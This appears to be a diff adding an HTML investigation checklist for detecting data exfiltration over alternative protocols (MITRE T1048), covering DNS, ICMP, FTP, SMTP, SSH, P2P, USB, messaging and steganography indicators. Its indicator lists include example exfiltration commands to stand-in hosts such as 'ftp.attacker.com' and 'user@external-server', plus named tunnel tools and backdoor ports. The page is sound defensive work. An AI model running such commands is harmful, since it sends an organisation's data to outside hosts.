@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Exfiltration Over Alternative Protocol (T1048)</title>
+
+<style>
+  :root{
+    --bg: #f5f5f5;
+    --card: #fff;
+    --text: #1f2937;
+    --muted: #6b7280;
+    --brand: #2563eb;
+    --border: #e5e7eb;
+    --focus: #fb923c;
+  }
+  @media (prefers-color-scheme: dark){
+    :root{
+      --bg:#0b0f14; --card:#111827; --text:#e5e7eb; --muted:#94a3b8;
+      --brand:#60a5fa; --border:#1f2937; --focus:#fdba74;
+    }
+  }
+  html,body{height:100%}
+  body{
+    font-family: system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, sans-serif;
+    margin:0; background:var(--bg); color:var(--text); line-height:1.6;
+  }
+  .wrap{max-width:1000px; margin:0 auto; padding:24px}
+  a{color:var(--brand)}
+  a[target="_blank"]::after{content:" ↗"; font-size:.85em; color:var(--muted)}
+  .skip-link{
+    position:absolute; left:-999px; top:auto; width:1px; height:1px; overflow:hidden;
+  }
+  .skip-link:focus{position:static; width:auto; height:auto; padding:.5rem; background:var(--card); border:1px solid var(--border)}
+  header{position:sticky; top:0; z-index:10; backdrop-filter:saturate(180%) blur(8px)}
+  .toolbar{
+    display:flex; gap:12px; align-items:center; padding:12px 24px;
+    border-bottom:1px solid var(--border); background-color:color-mix(in srgb, var(--card) 92%, transparent);
+  }
+  .toolbar h1{font-size:1.25rem; margin:0; flex:1}
+  .toolbar input[type="search"]{
+    max-width:340px; padding:.5rem .75rem; border:1px solid var(--border); border-radius:8px;
+    background:var(--card); color:var(--text)
+  }
+  .toolbar button{
+    padding:.5rem .75rem; border:1px solid var(--border); border-radius:8px;
+    background:var(--card); color:var(--text); cursor:pointer
+  }
+  .toolbar button:focus-visible{outline:3px solid var(--focus); outline-offset:2px}
+
+  nav.toc{
+    margin:16px 0 24px; padding:12px; background:var(--card); border:1px solid var(--border);
+    border-radius:10px;
+  }
+  nav.toc ul{margin:0; padding-left:18px}
+  nav.toc li{margin:.25rem 0}
+
+  h2{
+    color:var(--text); border-bottom:2px solid var(--brand);
+    padding-bottom:6px; margin-top:28px;
+  }
+  details.section{
+    background:var(--card); border:1px solid var(--border); border-radius:12px; margin:16px 0; overflow:hidden
+  }
+  details.section > summary{
+    list-style:none; cursor:pointer; padding:12px 16px; font-weight:600;
+  }
+  details.section > summary::-webkit-details-marker{display:none}
+  details.section[open] > summary{border-bottom:5px solid var(--border)}
+  details.section > div{padding:16px}
+  ul{padding-left:18px}
+  ul.checklist{list-style:none; margin:0; padding:8px 12px}
+  .item{
+    display:flex; gap:10px; align-items:flex-start; background:transparent; padding:8px; border-radius:8px;
+  }
+  .item:hover{background-color:color-mix(in srgb, var(--brand) 8%, transparent)}
+  .item input[type="checkbox"]{flex-shrink:0; margin-top:3px; cursor:pointer}
+  .item label{cursor:pointer}
+  code{
+    background:color-mix(in srgb, var(--text) 8%, transparent); padding:2px 6px;
+    border-radius:4px; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
+    font-size:.9em; word-break:break-word;
+  }
+
+  hr{border:0; border-top:1px solid var(--border); margin:16px 0}
+
+  @media print{
+    header, .toolbar, nav.toc{display:none}
+    body{background:#fff; color:#000}
+    details.section{border:none}
+    details.section[open] > summary, details.section > summary{border:none}
+    details.section{page-break-inside:avoid}
+  }
+
+  @media (prefers-reduced-motion:no-preference){
+    details.section{transition: box-shadow .2s ease}
+    details.section:hover{box-shadow:0 2px 20px color-mix(in srgb, var(--brand) 12%, transparent)}
+  }
+</style>
+</head>
+
+<body>
+<a class="skip-link" href="#main">Skip to content</a>
+
+<header>
+  <div class="toolbar">
+    <h1>Exfiltration Over Alternative Protocol: <a href="https://attack.mitre.org/techniques/T1048/" target="_blank" rel="noopener noreferrer">T1048</a></h1>
+    <input id="filter" type="search" placeholder="Filter checklist…" aria-label="Filter checklist items">
+    <button id="expand">Expand all</button>
+    <button id="collapse">Collapse all</button>
+    <button id="clear">Clear checks</button>
+  </div>
+</header>
+
+<main id="main" class="wrap" tabindex="-1">
+  <nav class="toc" aria-label="Table of contents">
+    <strong>Sections</strong>
+    <ul>
+      <li><a href="#sec-detection">Detection explanation</a></li>
+      <li><a href="#sec-indicators">Key detection indicators & areas</a></li>
+      <li><a href="#sec-checklist">Investigation Checklist</a></li>
+    </ul>
+  </nav>
+
+  <section aria-labelledby="sec-detection">
+    <h2 id="sec-detection">Detection Explanation</h2>
+    <p>Exfiltration Over Alternative Protocol involves adversaries using network protocols other than their primary command and control channel to steal data from compromised networks. This technique enables attackers to bypass security controls focused on standard web traffic, evade data loss prevention (DLP) systems, and use unexpected communication channels to covertly transfer stolen data. Alternative protocols are commonly used during the final exfiltration phase after data has been collected and staged.</p>
+    <p>Attackers use alternative protocols because they often receive less scrutiny than standard HTTP/HTTPS traffic, may bypass content inspection systems, and can leverage legitimate services that are allowed through firewalls. Common methods include exfiltration over symmetric encrypted non-C2 protocols (T1048.001), exfiltration over asymmetric encrypted non-C2 protocols (T1048.002), and exfiltration over unencrypted/obfuscated non-C2 protocols (T1048.003). Protocols frequently abused include DNS, FTP, SMTP, ICMP, SSH, custom protocols, and various messaging or file transfer services.</p>
+    <p>Successful exfiltration over alternative protocols enables attackers to steal sensitive data while avoiding detection by security tools that focus primarily on HTTP/HTTPS traffic or standard C2 communications. This technique is particularly effective when combined with data staging and compression, as attackers can systematically exfiltrate large volumes of data over time using legitimate-appearing network traffic. The impact includes theft of intellectual property, customer data, financial records, credentials, trade secrets, and other sensitive information with reduced likelihood of detection.</p>
+    <p>Detection requires monitoring for unusual protocol usage, tracking abnormal volumes of traffic on non-standard protocols, identifying data transfers to unexpected destinations, and correlating alternative protocol activity with data staging and collection behaviors. Organizations should establish baselines for legitimate protocol usage and alert on anomalies such as DNS queries with unusual sizes, ICMP traffic from servers, FTP uploads to external sites, SMTP traffic from non-mail servers, or SSH connections to unexpected destinations.</p>
+  </section>
+
+  <section aria-labelledby="sec-indicators">
+    <h2 id="sec-indicators">Key Detection Indicators & Areas to Investigate</h2>
+    <h3>Summary of Indicators</h3>
+    <ol>
+      <li>DNS exfiltration via oversized queries or TXT records (T1048.003)</li>
+      <li>ICMP tunnel creation and data exfiltration (T1048.003)</li>
+      <li>FTP/FTPS uploads to external or unusual destinations (T1048.001)</li>
+      <li>SMTP traffic from non-mail servers or unusual email patterns (T1048.003)</li>
+      <li>SSH/SCP connections to unexpected external hosts (T1048.002)</li>
+      <li>Custom protocol usage on non-standard ports</li>
+      <li>Peer-to-peer (P2P) protocol exfiltration</li>
+      <li>Physical or alternative network path exfiltration</li>
+      <li>Messaging protocol abuse (XMPP, IRC, Telegram)</li>
+      <li>Steganography or covert channel exfiltration</li>
+    </ol>
+  </section>
+
+  <details class="section" id="sec-1">
+    <summary>1. DNS Exfiltration via Oversized Queries or TXT Records</summary>
+    <div>
+      <p><strong>DNS Logs:</strong></p>
+      <ul>
+        <li>Query logs showing unusually long domain names</li>
+        <li>High volume of DNS queries from single host</li>
+        <li>TXT, NULL, or other unusual record type queries</li>
+        <li>Queries to suspicious or newly registered domains</li>
+        <li>Base64 or hex-encoded data in subdomain labels</li>
+      </ul>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 22 (DNS query) - Suspicious DNS query patterns</li>
+        <li>Event ID 3 (Network connection) - DNS connections to unusual resolvers</li>
+        <li>Key fields: <code>QueryName</code>, <code>QueryResults</code>, <code>Image</code></li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - DNS traffic (UDP/TCP port 53) volume anomalies</li>
+        <li>IDS/IPS - DNS tunneling signatures, oversized queries</li>
+        <li>Netflow - Excessive DNS query volumes, unusual query patterns</li>
+        <li>DNS server logs - Query types, response codes, query lengths</li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>DNS queries exceeding normal length (&gt;63 characters per label, &gt;253 total)</li>
+        <li>High frequency of DNS queries from non-DNS infrastructure</li>
+        <li>TXT record queries from workstations or servers</li>
+        <li>Queries to domains with random-appearing subdomains</li>
+        <li>DNS traffic to external or unauthorized DNS servers</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>DNS queries with subdomain lengths &gt;50 characters containing base64 or hex patterns</li>
+        <li>Query volume from single host exceeding 1000 queries per hour</li>
+        <li>TXT, NULL, CNAME, or MX record queries from non-infrastructure systems</li>
+        <li>Queries containing data patterns: <code>MTIzNDU2Nzg5MA==.attacker.com</code> (base64 encoded)</li>
+        <li>Sequential DNS queries with incrementing identifiers: <code>data1.</code>, <code>data2.</code>, <code>data3.</code></li>
+        <li>Queries to newly registered domains or domains with poor reputation</li>
+        <li>DNS queries from web servers, database servers, or workstations (not DNS clients)</li>
+        <li>Subdomains with entropy suggesting encoded data rather than legitimate names</li>
+        <li>DNS responses with unusually large TXT records (&gt;512 bytes)</li>
+        <li>DNS traffic bypassing corporate DNS servers (direct to external resolvers)</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-2">
+    <summary>2. ICMP Tunnel Creation and Data Exfiltration</summary>
+    <div>
+      <p><strong>Windows Event Logs (Security):</strong></p>
+      <ul>
+        <li>Event ID 5156 (Windows Filtering Platform connection) - ICMP connections allowed</li>
+        <li>Event ID 5157 (Windows Filtering Platform blocked) - ICMP connection attempts</li>
+      </ul>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 3 (Network connection) - ICMP protocol usage</li>
+        <li>Event ID 1 (Process creation) - ICMP tunnel tools execution</li>
+        <li>Key fields: <code>Protocol</code> (set to ICMP), <code>SourceIp</code>, <code>DestinationIp</code></li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - ICMP traffic (protocol 1) from non-infrastructure systems</li>
+        <li>IDS/IPS - ICMP tunneling signatures (oversized payloads, unusual patterns)</li>
+        <li>Packet captures - ICMP payload analysis for data patterns</li>
+        <li>Netflow - ICMP traffic volume and session duration</li>
+      </ul>
+      <p><strong>Common ICMP Tunnel Tools:</strong></p>
+      <ul>
+        <li><code>ptunnel</code>, <code>icmpsh</code>, <code>icmptunnel</code></li>
+        <li><code>pingtunnel</code>, <code>Hans</code>, <code>ICMP-Shell</code></li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>ICMP traffic from servers or workstations (not network monitoring)</li>
+        <li>Oversized ICMP echo requests/replies (&gt;64 bytes payload)</li>
+        <li>Persistent ICMP sessions rather than single ping requests</li>
+        <li>ICMP traffic to external IP addresses</li>
+        <li>Unusual ICMP types (not standard echo request/reply)</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>ICMP packets with payloads &gt;100 bytes from workstations or servers</li>
+        <li>Persistent ICMP traffic streams (duration &gt;1 minute) from single host</li>
+        <li>ICMP echo requests/replies with non-standard data patterns (not repeating characters)</li>
+        <li>High volume of ICMP traffic: &gt;100 packets per minute from single source</li>
+        <li>ICMP traffic from processes other than <code>ping.exe</code> or network monitoring tools</li>
+        <li>ICMP packets to external IPs outside of troubleshooting or monitoring contexts</li>
+        <li>ICMP type codes other than 8 (echo request) or 0 (echo reply): type 13, 15, 17</li>
+        <li>Bidirectional ICMP communication suggesting tunneling rather than testing</li>
+        <li>ICMP packets with payloads containing base64, hex, or encrypted-looking data</li>
+        <li>Processes executing ICMP tunnel tools: <code>ptunnel</code>, <code>icmpsh</code>, custom ICMP utilities</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-3">
+    <summary>3. FTP/FTPS Uploads to External or Unusual Destinations</summary>
+    <div>
+      <p><strong>Windows Event Logs (Security):</strong></p>
+      <ul>
+        <li>Event ID 4688 (Process creation) - FTP client execution</li>
+        <li>Event ID 5156 (Windows Filtering Platform connection) - FTP connections</li>
+      </ul>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 1 (Process creation) - FTP client or script execution</li>
+        <li>Event ID 3 (Network connection) - Connections to TCP ports 20-21 (FTP), 989-990 (FTPS)</li>
+        <li>Event ID 11 (File created) - Files staged before FTP upload</li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - FTP/FTPS connections (TCP ports 20, 21, 989, 990)</li>
+        <li>Proxy logs - FTP protocol usage, upload operations</li>
+        <li>IDS/IPS - FTP command patterns, large file transfers</li>
+        <li>FTP server logs - Authentication, file uploads, connection sources</li>
+      </ul>
+      <p><strong>Command-Line Patterns:</strong></p>
+      <ul>
+        <li><code>ftp.exe -s:script.txt ftp.attacker.com</code></li>
+        <li><code>curl.exe -T file.zip ftp://external-server/</code></li>
+        <li><code>winscp.com /script=upload.txt</code></li>
+        <li>PowerShell: <code>Send-FtpFile -Server external.com -File data.zip</code></li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>FTP uploads from non-administrative systems</li>
+        <li>FTP connections to external or unknown destinations</li>
+        <li>Large file transfers via FTP</li>
+        <li>Automated FTP scripts or scheduled FTP operations</li>
+        <li>FTP activity during off-hours</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li><code>ftp.exe</code> executed with <code>-s</code> parameter (scripted uploads) from workstations</li>
+        <li>FTP connections to external IP addresses or non-corporate FTP servers</li>
+        <li>FTP PUT commands uploading files from staging directories: <code>%TEMP%</code>, <code>C:\Users\Public\</code></li>
+        <li>Large file transfers (&gt;50MB) via FTP to external destinations</li>
+        <li>FTP client processes spawned from Office applications, browsers, or script interpreters</li>
+        <li>Anonymous FTP uploads or connections using default credentials</li>
+        <li>FTP activity from database servers, web servers, or domain controllers</li>
+        <li>Multiple files uploaded sequentially via FTP within short timeframe</li>
+        <li>FTP connections during off-hours (00:00-06:00) or weekends</li>
+        <li>WinSCP, FileZilla, or other FTP clients with automated script parameters</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-4">
+    <summary>4. SMTP Traffic from Non-Mail Servers or Unusual Email Patterns</summary>
+    <div>
+      <p><strong>Windows Event Logs (Security):</strong></p>
+      <ul>
+        <li>Event ID 4688 (Process creation) - Email client or SMTP utility execution</li>
+        <li>Event ID 5156 (Windows Filtering Platform connection) - SMTP connections</li>
+      </ul>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 3 (Network connection) - Connections to TCP port 25 (SMTP), 587 (submission), 465 (SMTPS)</li>
+        <li>Event ID 1 (Process creation) - SMTP clients or scripts</li>
+        <li>Key fields: <code>DestinationPort</code>, <code>DestinationIp</code>, <code>Image</code></li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - SMTP traffic (TCP 25, 587, 465) from non-mail servers</li>
+        <li>Mail gateway logs - Email sent from internal hosts to external addresses</li>
+        <li>IDS/IPS - SMTP protocol anomalies, large attachments</li>
+        <li>Proxy logs - SMTP connections bypassing mail relays</li>
+      </ul>
+      <p><strong>Email Patterns:</strong></p>
+      <ul>
+        <li>Large attachments from non-mail systems</li>
+        <li>Emails with generic subjects: "Data", "Backup", "Files"</li>
+        <li>Automated emails sent in rapid succession</li>
+        <li>Emails to external personal accounts (Gmail, Yahoo, Outlook)</li>
+        <li>Base64-encoded content in email bodies</li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>SMTP connections from workstations, servers (not mail servers)</li>
+        <li>Direct SMTP connections bypassing corporate mail relay</li>
+        <li>Emails with large attachments or unusual content</li>
+        <li>Automated email sending scripts</li>
+        <li>SMTP traffic during off-hours</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>Workstations or application servers making direct SMTP connections (port 25) to external mail servers</li>
+        <li>Processes other than legitimate mail clients connecting to SMTP ports</li>
+        <li>PowerShell scripts using <code>Send-MailMessage</code> or <code>System.Net.Mail.SmtpClient</code></li>
+        <li>SMTP connections bypassing corporate mail relay to Gmail, Yahoo, or other external providers</li>
+        <li>Emails with large attachments (&gt;10MB) sent from non-mail server systems</li>
+        <li>Multiple emails sent within minutes to external personal email accounts</li>
+        <li>Email subjects or bodies containing generic terms: "backup", "data export", "files"</li>
+        <li>Base64-encoded content in email bodies (encoded files embedded in message)</li>
+        <li>SMTP traffic from database servers, file servers, or domain controllers</li>
+        <li>Emails sent via command-line tools: <code>blat.exe</code>, <code>sendmail</code>, or custom scripts</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-5">
+    <summary>5. SSH/SCP Connections to Unexpected External Hosts</summary>
+    <div>
+      <p><strong>Windows Event Logs (Security):</strong></p>
+      <ul>
+        <li>Event ID 4688 (Process creation) - SSH/SCP client execution</li>
+        <li>Event ID 5156 (Windows Filtering Platform connection) - SSH connections</li>
+      </ul>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 1 (Process creation) - SSH clients (PuTTY, OpenSSH, WinSCP, pscp)</li>
+        <li>Event ID 3 (Network connection) - Connections to TCP port 22</li>
+        <li>Event ID 11 (File created) - SSH keys or configuration files</li>
+      </ul>
+      <p><strong>Linux/Unix Logs:</strong></p>
+      <ul>
+        <li><code>/var/log/auth.log</code> or <code>/var/log/secure</code> - SSH client connections</li>
+        <li>Bash history - SSH/SCP commands</li>
+        <li><code>.ssh/known_hosts</code> - Connection history</li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - SSH traffic (TCP port 22) to external destinations</li>
+        <li>IDS/IPS - SSH protocol anomalies, tunnel detection</li>
+        <li>Netflow - SSH session duration and data volumes</li>
+      </ul>
+      <p><strong>Command-Line Patterns:</strong></p>
+      <ul>
+        <li><code>ssh user@external-server.com</code></li>
+        <li><code>scp -r /data/ user@external-server:/backup/</code></li>
+        <li><code>pscp.exe -scp -r C:\Data\ user@external:/tmp/</code></li>
+        <li><code>sftp user@external-server</code> with batch upload commands</li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>SSH connections to external or non-corporate IP addresses</li>
+        <li>SCP/SFTP file transfers to unknown destinations</li>
+        <li>SSH from non-administrative systems or users</li>
+        <li>Large data transfers over SSH</li>
+        <li>SSH connections during off-hours</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>SSH connections from workstations to external IP addresses not in corporate infrastructure</li>
+        <li><code>ssh.exe</code>, <code>putty.exe</code>, <code>pscp.exe</code> executed by non-administrative users</li>
+        <li>SCP file transfers uploading data from staging directories to external hosts</li>
+        <li>SSH connections to newly created cloud instances or VPS providers</li>
+        <li>Large outbound data transfers over port 22 (&gt;100MB) from single source</li>
+        <li>SSH client processes spawned from script interpreters or Office applications</li>
+        <li>SSH connections to IP addresses in high-risk geographic regions</li>
+        <li>Multiple SSH connections to different external hosts from same system</li>
+        <li>SSH key generation followed immediately by external SSH connection</li>
+        <li>SFTP batch uploads: multiple files transferred sequentially over SSH</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-6">
+    <summary>6. Custom Protocol Usage on Non-Standard Ports</summary>
+    <div>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 3 (Network connection) - Connections to unusual ports</li>
+        <li>Key fields: <code>DestinationPort</code>, <code>DestinationIp</code>, <code>Image</code>, <code>Initiated</code></li>
+      </ul>
+      <p><strong>Windows Event Logs (Security):</strong></p>
+      <ul>
+        <li>Event ID 5156 (Windows Filtering Platform connection) - Custom port usage</li>
+        <li>Event ID 5157 (Windows Filtering Platform blocked) - Blocked non-standard connections</li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - Traffic to non-standard ports (&gt;1024, not common services)</li>
+        <li>IDS/IPS - Unknown protocol signatures, custom application protocols</li>
+        <li>Netflow - Traffic volume on unusual ports</li>
+        <li>Packet captures - Protocol analysis of non-standard traffic</li>
+      </ul>
+      <p><strong>Unusual Ports:</strong></p>
+      <ul>
+        <li>High-numbered ports: 8000-9000, 40000-50000</li>
+        <li>Ports mimicking common services: 8080 (HTTP-like), 4443 (HTTPS-like)</li>
+        <li>Random or uncommon ports: 31337, 12345, 54321</li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>Outbound connections to unusual destination ports</li>
+        <li>Custom protocols without legitimate business purpose</li>
+        <li>High-volume data transfers on non-standard ports</li>
+        <li>Encrypted traffic on unusual ports</li>
+        <li>Connections to external IPs on custom ports</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>Outbound connections to high-numbered ports (&gt;10000) to external IPs</li>
+        <li>Traffic to ports not associated with any legitimate business application</li>
+        <li>Large data transfers (&gt;50MB) on non-standard ports</li>
+        <li>Encrypted or binary protocol traffic on unusual ports (not HTTPS on 443)</li>
+        <li>Connections to ports commonly used by backdoors: 31337, 12345, 4444, 5555</li>
+        <li>Persistent connections on custom ports with periodic data exchange</li>
+        <li>Multiple systems connecting to same external IP on unusual port</li>
+        <li>Custom protocol traffic bypassing proxy or application inspection</li>
+        <li>Connections initiated by processes in <code>%TEMP%</code>, <code>%APPDATA%</code>, or user directories</li>
+        <li>Port usage matching known malware C2 ports: Cobalt Strike (50050), Meterpreter (4444)</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-7">
+    <summary>7. Peer-to-Peer (P2P) Protocol Exfiltration</summary>
+    <div>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 3 (Network connection) - P2P protocol connections</li>
+        <li>Event ID 1 (Process creation) - P2P client execution</li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - P2P protocol signatures, BitTorrent traffic</li>
+        <li>IDS/IPS - P2P protocol detection (BitTorrent, eDonkey, Gnutella)</li>
+        <li>Netflow - P2P traffic patterns (many connections, distributed hosts)</li>
+        <li>DPI (Deep Packet Inspection) - P2P protocol identification</li>
+      </ul>
+      <p><strong>P2P Protocols:</strong></p>
+      <ul>
+        <li>BitTorrent (TCP 6881-6889, various)</li>
+        <li>eDonkey/eMule (TCP 4661-4665)</li>
+        <li>Gnutella (TCP 6346-6347)</li>
+        <li>Direct Connect (TCP 411, 412)</li>
+        <li>IPFS (TCP 4001)</li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>P2P client installation or execution on corporate systems</li>
+        <li>P2P protocol traffic from servers or sensitive systems</li>
+        <li>Seeding or uploading via P2P protocols</li>
+        <li>P2P connections to many external peers</li>
+        <li>Custom or less common P2P protocols</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>BitTorrent client processes: <code>bittorrent.exe</code>, <code>utorrent.exe</code>, <code>transmission</code></li>
+        <li>P2P protocol signatures in network traffic from corporate systems</li>
+        <li>High number of simultaneous connections (&gt;50) to distributed external IPs</li>
+        <li>Upload traffic via P2P protocols (seeding behavior)</li>
+        <li>P2P clients executed from <code>%TEMP%</code> or portable/standalone installations</li>
+        <li>IPFS daemon or client running on non-development systems</li>
+        <li>P2P protocol usage from servers, databases, or domain controllers</li>
+        <li>Distributed hash table (DHT) traffic patterns</li>
+        <li>Magnet links or torrent file downloads followed by P2P client execution</li>
+        <li>P2P traffic during off-hours or from service accounts</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-8">
+    <summary>8. Physical or Alternative Network Path Exfiltration</summary>
+    <div>
+      <p><strong>Windows Event Logs (Security):</strong></p>
+      <ul>
+        <li>Event ID 4663 (Access attempted to object) - File writes to removable media</li>
+        <li>Event ID 4656 (Handle to object requested) - Removable drive access</li>
+        <li>Event ID 6416 (External device recognized) - New device connected</li>
+      </ul>
+      <p><strong>Windows Event Logs (System):</strong></p>
+      <ul>
+        <li>Event ID 7036 (Service state change) - USB storage driver start</li>
+        <li>Event ID 20001 (Device installation) - New device installation</li>
+        <li>Event ID 10000 (DriverFrameworks-UserMode) - USB device connected</li>
+      </ul>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 11 (File created) - Files written to removable media</li>
+        <li>Event ID 1 (Process creation) - Processes accessing removable drives</li>
+        <li>Event ID 23 (File deleted) - File deletion from primary storage after copy</li>
+      </ul>
+      <p><strong>Registry Keys:</strong></p>
+      <ul>
+        <li>USB device history: <code>HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR</code></li>
+        <li>Mounted devices: <code>HKLM\SYSTEM\MountedDevices</code></li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>Files copied to removable media drives</li>
+        <li>Large data transfers to USB drives</li>
+        <li>Removable media usage during off-hours</li>
+        <li>Files copied then deleted after transfer</li>
+        <li>Unauthorized or unregistered device usage</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>Event ID 6416 showing USB mass storage device connection during off-hours</li>
+        <li>Large files (&gt;100MB) or many files copied to removable drives</li>
+        <li>Archives (<code>.zip</code>, <code>.rar</code>, <code>.7z</code>) written to USB drives</li>
+        <li>Sensitive directories copied to removable media: <code>Documents\</code>, <code>Database\</code></li>
+        <li>Files copied to removable drive then deleted from source (Event ID 4663 + Event ID 23)</li>
+        <li>USB device connection from systems handling sensitive data</li>
+        <li>Removable media usage by accounts that don't typically use such devices</li>
+        <li>Multiple files copied to external drive within short timeframe</li>
+        <li>USB device serial numbers not registered in asset management</li>
+        <li>File transfer to removable media followed by immediate device removal</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-9">
+    <summary>9. Messaging Protocol Abuse (XMPP, IRC, Telegram)</summary>
+    <div>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 3 (Network connection) - Connections to messaging service ports</li>
+        <li>Event ID 1 (Process creation) - Messaging client execution</li>
+        <li>Event ID 22 (DNS query) - DNS queries to messaging service domains</li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Firewall logs - Connections to messaging service IPs/ports</li>
+        <li>Proxy logs - Messaging protocol traffic, API calls</li>
+        <li>IDS/IPS - XMPP, IRC protocol signatures</li>
+        <li>DNS logs - Queries to messaging service domains</li>
+      </ul>
+      <p><strong>Messaging Protocols/Services:</strong></p>
+      <ul>
+        <li>IRC (TCP 6667, 6697)</li>
+        <li>XMPP/Jabber (TCP 5222, 5223)</li>
+        <li>Telegram (various ports, API endpoints)</li>
+        <li>Discord (HTTPS API calls)</li>
+        <li>Slack (HTTPS API calls)</li>
+        <li>Matrix protocol</li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>Messaging protocol usage from non-user systems</li>
+        <li>Automated messaging or bot activity</li>
+        <li>File transfers via messaging protocols</li>
+        <li>Messaging from servers or infrastructure systems</li>
+        <li>Use of messaging APIs for data transmission</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>IRC connections (ports 6667, 6697) from servers, workstations, or automated processes</li>
+        <li>XMPP protocol traffic from non-communication systems</li>
+        <li>Telegram API calls (<code>api.telegram.org</code>) from scripts or automated processes</li>
+        <li>Discord webhook usage for data exfiltration: <code>discord.com/api/webhooks/</code></li>
+        <li>Slack incoming webhooks sending large message payloads or file attachments</li>
+        <li>IRC bot commands or automated message patterns</li>
+        <li>Messaging client processes spawned from scripts or scheduled tasks</li>
+        <li>Base64-encoded data sent via messaging APIs</li>
+        <li>High frequency of messaging API calls (&gt;100 per hour) from single source</li>
+        <li>File uploads to messaging services from non-user accounts or servers</li>
+      </ul>
+    </div>
+  </details>
+
+  <details class="section" id="sec-10">
+    <summary>10. Steganography or Covert Channel Exfiltration</summary>
+    <div>
+      <p><strong>Sysmon:</strong></p>
+      <ul>
+        <li>Event ID 1 (Process creation) - Steganography tool execution</li>
+        <li>Event ID 11 (File created) - Images or media files created/modified</li>
+        <li>Event ID 3 (Network connection) - Upload of steganographic carriers</li>
+      </ul>
+      <p><strong>Windows Event Logs (Security):</strong></p>
+      <ul>
+        <li>Event ID 4688 (Process creation) - Image manipulation tools</li>
+        <li>Event ID 4663 (Access attempted to object) - Access to image files</li>
+      </ul>
+      <p><strong>Network Logs:</strong></p>
+      <ul>
+        <li>Proxy logs - Image uploads to social media, file sharing</li>
+        <li>Firewall logs - Large image/media file transfers</li>
+        <li>HTTP traffic analysis - Unusual image upload patterns</li>
+      </ul>
+      <p><strong>Steganography Tools:</strong></p>
+      <ul>
+        <li><code>steghide</code>, <code>openstego</code>, <code>outguess</code></li>
+        <li><code>jphide</code>, <code>jpseek</code>, <code>stegdetect</code></li>
+        <li>Custom Python/PowerShell steganography scripts</li>
+      </ul>
+      <p><strong>Covert Channels:</strong></p>
+      <ul>
+        <li>HTTP header manipulation</li>
+        <li>Timing-based channels</li>
+        <li>Protocol field abuse (IP ID, TCP sequence numbers)</li>
+        <li>DNS NULL records</li>
+        <li>Image EXIF data</li>
+      </ul>
+      <p><strong>Focus on:</strong></p>
+      <ul>
+        <li>Steganography tool execution</li>
+        <li>Large numbers of images created or uploaded</li>
+        <li>Image files modified then uploaded to external services</li>
+        <li>Unusual patterns in network protocol fields</li>
+        <li>Timing patterns suggesting covert communication</li>
+      </ul>
+      <p><strong>Suspicious indicators:</strong></p>
+      <ul>
+        <li>Steganography tools executed: <code>steghide</code>, <code>openstego</code>, image manipulation scripts</li>
+        <li>Large volumes of image files (<code>.png</code>, <code>.jpg</code>, <code>.bmp</code>) created or modified</li>
+        <li>Images uploaded to social media or image hosting sites from corporate systems</li>
